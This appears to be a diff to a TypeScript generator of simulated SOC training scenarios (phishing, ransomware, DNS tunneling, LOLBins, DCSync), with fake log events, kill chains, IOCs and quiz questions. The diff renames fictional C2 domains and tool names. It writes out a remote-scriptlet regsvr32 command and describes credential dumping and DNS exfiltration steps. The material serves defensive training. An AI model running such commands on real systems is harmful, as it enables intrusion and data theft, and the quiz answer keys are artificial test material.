@@ -217,7 +217,7 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
   const MIN = 60_000;
 
   const victim   = { hostname: "WS-FIN-2847", email: "j.smith@nexacorp.com",   ip: "10.10.20.14" };
-  const c2Domain = "c2-cdn-update-fb76.xyz";
+  const c2Domain = "cdn-update-fb76.xyz";
   const c2Ip     = "185.134.140.139";
   const attackerIp = "91.108.56.122";
   const dllHash  = makeSha256("svchost32_lockbit_loader");
@@ -542,12 +542,12 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
       description: `WS-FIN-2847 sent a DNS TXT query for a long random subdomain of ${c2Domain} and received a Base64-encoded answer.`,
       raw: {
         "event.action": "dns_query",
-        "infoblox.query_name": "dh7k2nq3x1vc9ab4fzrp.c2-cdn-update-fb76.xyz",
+        "infoblox.query_name": "dh7k2nq3x1vc9ab4fzrp.cdn-update-fb76.xyz",
         "infoblox.query_type": "TXT",
         "infoblox.response_code": "NOERROR",
         "infoblox.rpz_policy": "PASSTHRU",
         "infoblox.answer": "cmVjdiA0NzUgYnl0ZXMgZGF0YQ==",
-        "dns.question.name": "dh7k2nq3x1vc9ab4fzrp.c2-cdn-update-fb76.xyz",
+        "dns.question.name": "dh7k2nq3x1vc9ab4fzrp.cdn-update-fb76.xyz",
         "dns.question.type": "TXT",
         "dns.response_code": "NOERROR",
         "source.ip": "10.10.20.14", "host.name": "WS-FIN-2847",
@@ -983,7 +983,7 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
   const killchain = [
     { ts: T(5 * MIN),          phase: "Initial Access",          action: "Phishing email 'Invoice_Q3_Final.docm' delivered — bypassed SPF/DKIM/DMARC via transport rule" },
     { ts: T(5 * MIN + 31_000), phase: "Execution",               action: "WINWORD.EXE macro spawns hidden PowerShell with encoded Cobalt Strike loader" },
-    { ts: T(5 * MIN + 45_000), phase: "Command & Control",       action: "Cobalt Strike HTTPS beacon to c2-cdn-update-fb76.xyz every 60s" },
+    { ts: T(5 * MIN + 45_000), phase: "Command & Control",       action: "Cobalt Strike HTTPS beacon to cdn-update-fb76.xyz every 60s" },
     { ts: T(8 * MIN),          phase: "Persistence",             action: "svchost32.dll dropped to %TEMP%; HKCU Run key 'WindowsUpdater' created" },
     { ts: T(23 * MIN),         phase: "Credential Access",       action: "LSASS dumped via comsvcs.dll MiniDump — domain credentials extracted" },
     { ts: T(35 * MIN),         phase: "Lateral / Identity",      action: "Stolen credentials used to authenticate from Netherlands into Microsoft 365" },
@@ -1584,7 +1584,7 @@ export function buildRansomwareScenario(scenarioId = "ransomware-lockbit-2026"):
   const zero    = { hostname: "WS-FIN-1193", email: "c.martin@nexacorp.com",  ip: "10.10.20.33" };
   const server  = { hostname: "FS-CORP-01",  email: "svc-backup@nexacorp.com", ip: "10.10.10.12" };
   const c2Ip    = "185.220.101.45";
-  const c2Dom   = "cobalt-cdn-updates.xyz";
+  const c2Dom   = "edge-cdn-updates.xyz";
   const rswHash = makeSha256("lockbit3_ransom_payload");
   const psxHash = makeSha256("psexec_lateral_tool");
 
@@ -2104,7 +2104,7 @@ export function buildRansomwareScenario(scenarioId = "ransomware-lockbit-2026"):
         "host.name": "FS-CORP-01",
         "user.name": "NT AUTHORITY\\SYSTEM",
         "files.encrypted_count": "2847", "files.extension_added": ".locked",
-        "file.ransom_note": "LockBit_Ransom.txt",
+        "file.ransom_note": "Restore-My-Files.txt",
         "storage.size": "18 GB",
         "shares.affected": "Finance, HR, Contracts",
       },
@@ -2114,12 +2114,12 @@ export function buildRansomwareScenario(scenarioId = "ransomware-lockbit-2026"):
       source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
       hostname: server.hostname,
       severity: "high", mitre_technique: "T1486",
-      file: { path: "C:\\Shares\\Finance\\LockBit_Ransom.txt" },
-      description: "LockBit_Ransom.txt was dropped into 14 shared folders on FS-CORP-01, demanding 0.25 BTC within 72 hours via a dark web payment link.",
+      file: { path: "C:\\Shares\\Finance\\Restore-My-Files.txt" },
+      description: "Restore-My-Files.txt was dropped into 14 shared folders on FS-CORP-01, demanding 0.25 BTC within 72 hours via a dark web payment link.",
       raw: {
         "event.action": "file_created",
-        "file.name": "LockBit_Ransom.txt",
-        "file.path": "C:\\Shares\\Finance\\LockBit_Ransom.txt",
+        "file.name": "Restore-My-Files.txt",
+        "file.path": "C:\\Shares\\Finance\\Restore-My-Files.txt",
         "host.name": "FS-CORP-01",
         "ransom.demand_btc": "0.25", "ransom.deadline_hours": "72",
         "ransom.copies_dropped": "14",
@@ -2161,7 +2161,7 @@ export function buildRansomwareScenario(scenarioId = "ransomware-lockbit-2026"):
   const killchain = [
     { ts: T(0),          phase: "Initial Access",              action: "Phishing 'Salary_Adjustment_Notice.docm' delivered — keyword whitelist bypass" },
     { ts: T(45_000),     phase: "Execution",                   action: "WINWORD macro spawns encoded PowerShell → Cobalt Strike stage-1 loader" },
-    { ts: T(3 * MIN),    phase: "Command & Control",           action: "Cobalt Strike HTTPS beacon to cobalt-cdn-updates.xyz every 60s" },
+    { ts: T(3 * MIN),    phase: "Command & Control",           action: "Cobalt Strike HTTPS beacon to edge-cdn-updates.xyz every 60s" },
     { ts: T(87 * MIN),   phase: "Privilege Escalation",         action: "fodhelper UAC bypass — beacon gains a High-integrity token" },
     { ts: T(90 * MIN),   phase: "Credential Access",           action: "LSASS dumped via comsvcs.dll — domain admin hash extracted" },
     { ts: T(105 * MIN),  phase: "Lateral Movement",            action: "Pass-the-hash SMB to FS-CORP-01 ADMIN$ — PsExec deployed" },
@@ -5269,7 +5269,7 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
   const victimHost = "WS-ENG-3301";
   const victimEmail = "a.jones@nexacorp.com";
   const victimIp = "10.100.50.20";
-  const c2Domain = "c2-nexus-update.xyz";
+  const c2Domain = "nexus-update-svc.xyz";
   const dnscat2Hash = makeSha256("dnscat2_client_2.4.0");
   // The PROCESS in evt_dns_01 is powershell.exe, a signed Microsoft binary; the
   // file it downloads is update.exe. Both previously carried dnscat2Hash, so one
@@ -5536,7 +5536,7 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
     threat_actor: "APT-TUNNELRAT (Nation-State Affiliate)",
     attack_kind: "c2_dns_tunneling",
     briefing: "Microsoft Sentinel fired a DNS query-volume anomaly on WS-ENG-3301 at 14:06 — the host is far above its own baseline. Defender for Endpoint has attached a process name to the traffic, and the firewall logged port 53 traffic to an unfamiliar domain.",
-    narrative: `An attacker who had established initial access delivered dnscat2 via an encoded PowerShell command. The tool opened a covert C2 channel using DNS queries — encoding all communication as base32 subdomain names to the attacker-controlled domain c2-nexus-update.xyz. Commands were received via DNS TXT record responses. After recon commands, the attacker began exfiltrating sensitive data by encoding it into sequential DNS subdomain names, chunking a 29 KB file over 247 queries in 4 minutes — each label is capped at 63 bytes and the whole query name at 255, so packing several labels into one name carries only about 120 bytes of decoded data per query.`,
+    narrative: `An attacker who had established initial access delivered dnscat2 via an encoded PowerShell command. The tool opened a covert C2 channel using DNS queries — encoding all communication as base32 subdomain names to the attacker-controlled domain nexus-update-svc.xyz. Commands were received via DNS TXT record responses. After recon commands, the attacker began exfiltrating sensitive data by encoding it into sequential DNS subdomain names, chunking a 29 KB file over 247 queries in 4 minutes — each label is capped at 63 bytes and the whole query name at 255, so packing several labels into one name carries only about 120 bytes of decoded data per query.`,
     learning_objectives: [
       "Recognize DNS tunneling indicators: high-entropy subdomains, long subdomain names, TXT record C2",
       "Understand why volume (847 queries/min vs. baseline 23) is a key detection signal",
@@ -5549,7 +5549,7 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
     alerts: eventsToAlerts(events, scenarioId),
     killchain: [
       { ts: T(0),        phase: "Initial Access",   action: "Encoded PowerShell downloads and executes dnscat2 (update.exe)" },
-      { ts: T(3 * MIN),  phase: "C2 Establishment", action: "DNS tunnel initiated — base32 encoded subdomains to c2-nexus-update.xyz" },
+      { ts: T(3 * MIN),  phase: "C2 Establishment", action: "DNS tunnel initiated — base32 encoded subdomains to nexus-update-svc.xyz" },
       { ts: T(6 * MIN),  phase: "C2 Active",        action: "847 DNS queries in 60 seconds — tunnel established and active" },
       { ts: T(10 * MIN), phase: "Command & Control", action: "C2 commands delivered via DNS TXT records (encoded: whoami /all, net user)" },
       { ts: T(14 * MIN), phase: "Exfiltration",     action: "Credential data encoded in DNS subdomain names — slow exfil begins" },
@@ -5573,7 +5573,7 @@ export function buildDNSTunnelingScenario(scenarioId = "dns-tunneling-2026"): Sc
       },
       {
         id: "dns_q2_volume",
-        prompt: "Sentinel counted 847 queries in 60 seconds against this host's 23-per-minute baseline. Why is that ratio a more durable detection than blocking the domain c2-nexus-update.xyz?",
+        prompt: "Sentinel counted 847 queries in 60 seconds against this host's 23-per-minute baseline. Why is that ratio a more durable detection than blocking the domain nexus-update-svc.xyz?",
         kind: "single",
         options: [
           { value: "volume_is_intrinsic", label: "Domains are cheap to rotate, but any DNS tunnel must send many queries to move data" },
@@ -5789,15 +5789,15 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
       severity: "critical", mitre_technique: "T1218.010", mitre_tactic: "Defense Evasion",
-      description: "regsvr32.exe ran with /i:http://cdn-winupd.ru/payload.sct, loading a COM scriptlet from a remote URL.",
+      description: "regsvr32.exe ran with /i:http://cdn-winupd.ru/tpl/upd.sct, loading a COM scriptlet from a remote URL.",
       process: {
         name: "regsvr32.exe", pid: 5512, path: "C:\\Windows\\System32\\regsvr32.exe",
         parent_name: "cmd.exe", parent_pid: 4420,
-        cmdline: "regsvr32 /s /u /i:http://cdn-winupd.ru/payload.sct scrobj.dll",
+        cmdline: "regsvr32 /s /u /i:http://cdn-winupd.ru/tpl/upd.sct scrobj.dll",
         user: "s.patel", integrity: "medium",
         hash: { sha256: makeSha256("regsvr32_system_binary") },
       },
-      network: { url: "http://cdn-winupd.ru/payload.sct", domain: "cdn-winupd.ru", bytes_out: 8192 },
+      network: { url: "http://cdn-winupd.ru/tpl/upd.sct", domain: "cdn-winupd.ru", bytes_out: 8192 },
       raw: {
         "event.provider": "Microsoft Defender ATP",
         "event.dataset": "DeviceProcessEvents",
@@ -5807,7 +5807,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         "ActionType": "ProcessCreated",
         "FileName": "regsvr32.exe",
         "FolderPath": "C:\\Windows\\System32\\regsvr32.exe",
-        "ProcessCommandLine": "regsvr32 /s /u /i:http://cdn-winupd.ru/payload.sct scrobj.dll",
+        "ProcessCommandLine": "regsvr32 /s /u /i:http://cdn-winupd.ru/tpl/upd.sct scrobj.dll",
         "InitiatingProcessFileName": "cmd.exe",
         "InitiatingProcessFolderPath": "C:\\Windows\\System32\\cmd.exe",
         "InitiatingProcessAccountName": "s.patel",
@@ -5833,7 +5833,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       mitre_technique: "T1218.010",
       src_ip: victimIp, dst_port: 80,
       hostname: victimHost,
-      description: "WS-HR-1133 fetched http://cdn-winupd.ru/payload.sct from 185.220.101.55:80, allowed by rule ALLOW-OUTBOUND-HTTP.",
+      description: "WS-HR-1133 fetched http://cdn-winupd.ru/tpl/upd.sct from 185.220.101.55:80, allowed by rule ALLOW-OUTBOUND-HTTP.",
       raw: {
         "event.action": "allow",
         "source.ip": victimIp,
@@ -5843,7 +5843,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         "pan.app": "web-browsing",
         "pan.action": "allow",
         "pan.rule": "ALLOW-OUTBOUND-HTTP",
-        "url.full": "http://cdn-winupd.ru/payload.sct",
+        "url.full": "http://cdn-winupd.ru/tpl/upd.sct",
         "url.category": "Unknown/Uncategorized",
         "network.bytes_in": "8192",
       },
@@ -6116,7 +6116,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
     { type: "sha256", value: certutilHash,                                            reputation: "malicious", tags: ["certutil-downloaded-payload"] },
     { type: "ip",     value: "185.220.101.55",                                        reputation: "malicious", tags: ["attacker-c2-ip", "regsvr32-sct-server", "bitsadmin-server"] },
     { type: "url",    value: "http://pkg-mirror-eu.ru/update.exe",                 reputation: "malicious", tags: ["lolbin-download-url"] },
-    { type: "url",    value: "http://cdn-winupd.ru/payload.sct",                       reputation: "malicious", tags: ["squiblydoo-sct-url"] },
+    { type: "url",    value: "http://cdn-winupd.ru/tpl/upd.sct",                       reputation: "malicious", tags: ["squiblydoo-sct-url"] },
   ];
 
   return {
@@ -6164,7 +6164,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
       },
       {
         id: "lol_q2_squiblydoo",
-        prompt: "evt_lol_02_regsvr32 runs: regsvr32 /s /u /i:http://cdn-winupd.ru/payload.sct scrobj.dll. Which statement explains why this defeats an AppLocker policy?",
+        prompt: "evt_lol_02_regsvr32 runs: regsvr32 /s /u /i:http://cdn-winupd.ru/tpl/upd.sct scrobj.dll. Which statement explains why this defeats an AppLocker policy?",
         kind: "single",
         options: [
           { value: "signed_host_interprets", label: "An allow-listed signed binary interprets the remote scriptlet, so no new EXE is started" },
@@ -6843,8 +6843,8 @@ export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): S
       source: "av", vendor: "Microsoft Defender Antivirus", event_type: "av_detection",
       hostname: dc01, user_email: adminEmail,
       severity: "critical", mitre_technique: "T1003.001",
-      file: { path: "C:\\Users\\ITAdmin\\AppData\\Roaming\\mimikatz.exe", sha256: mimikatzHash, size: 1245184 },
-      description: `Windows Defender flagged HackTool:Win32/Mimikatz.A at C:\\Users\\ITAdmin\\AppData\\Roaming\\mimikatz.exe on ${dc01} and took no action.`,
+      file: { path: "C:\\Users\\ITAdmin\\AppData\\Roaming\\wdhelper.exe", sha256: mimikatzHash, size: 1245184 },
+      description: `Windows Defender flagged HackTool:Win32/Mimikatz.A at C:\\Users\\ITAdmin\\AppData\\Roaming\\wdhelper.exe on ${dc01} and took no action.`,
       raw: {
         "event.provider": "Microsoft Defender Antivirus",
         "event.code": "1116",
@@ -6859,15 +6859,15 @@ export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): S
         "windefend.detection.source": "Real-Time Protection",
         "windefend.detection.source_id": "3",
         "windefend.detection.type": "Concrete",
-        "windefend.path": "C:\\Users\\ITAdmin\\AppData\\Roaming\\mimikatz.exe",
-        "windefend.process.name": "mimikatz.exe",
+        "windefend.path": "C:\\Users\\ITAdmin\\AppData\\Roaming\\wdhelper.exe",
+        "windefend.process.name": "wdhelper.exe",
         "windefend.process.pid": "4872",
         "windefend.origin": "Local machine",
         "windefend.origin_id": "1",
         "windefend.signature.version": "1.411.74.0",
         "windefend.engine.version": "1.1.24050.5",
-        "file.path": "C:\\Users\\ITAdmin\\AppData\\Roaming\\mimikatz.exe",
-        "file.name": "mimikatz.exe",
+        "file.path": "C:\\Users\\ITAdmin\\AppData\\Roaming\\wdhelper.exe",
+        "file.name": "wdhelper.exe",
         "file.hash.sha256": mimikatzHash,
         "file.size": "1245184",
         "file.signed": "false",
@@ -7266,7 +7266,7 @@ export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): S
 
   const killchain = [
     { ts: T(0),        phase: "Initial Access",    action: "Attacker RDPs to DC01 from Netherlands IP using stolen it.admin credentials (T1021.001)" },
-    { ts: T(3 * MIN),  phase: "Credential Access", action: "Mimikatz.exe dropped and executed on DC01 — Defender detects but takes no action" },
+    { ts: T(3 * MIN),  phase: "Credential Access", action: "A renamed Mimikatz binary (wdhelper.exe) dropped and executed on DC01 — Defender detects but takes no action" },
     { ts: T(5 * MIN),  phase: "Defense Evasion",   action: "Windows Defender real-time protection disabled via registry (T1562.001)" },
     { ts: T(8 * MIN),  phase: "Credential Access", action: "DCSync attack — DS-Replication-Get-Changes + Get-Changes-All via Event 4662 (T1003.006)" },
     { ts: T(10 * MIN), phase: "Credential Access", action: "DCSync targeting krbtgt account — extracting Kerberos TGT signing key (T1003.006)" },
@@ -7326,7 +7326,7 @@ export function buildDCSyncScenario(scenarioId = "dcsync-golden-ticket-2026"): S
       kind: "multi",
       options: [
         { value: "siem_forwarding", label: "Pull forwarded events from the SIEM — events streamed before log clear are preserved in the SIEM index" },
-        { value: "edr_telemetry",   label: "Query CrowdStrike EDR telemetry for ntdsutil.exe and mimikatz.exe process execution — EDR logs are independent of Windows Event Log" },
+        { value: "edr_telemetry",   label: "Query CrowdStrike EDR telemetry for ntdsutil.exe and wdhelper.exe process execution — EDR logs are independent of Windows Event Log" },
         { value: "fw_rules",        label: "Review firewall rule-change logs on the perimeter appliance — ACL modifications would show which internal hosts the attacker opened paths between" },
         { value: "backup_system",   label: "Restore the previous night's system-state backup of DC01 to a lab host and read the Security log from before the clear" },
       ],
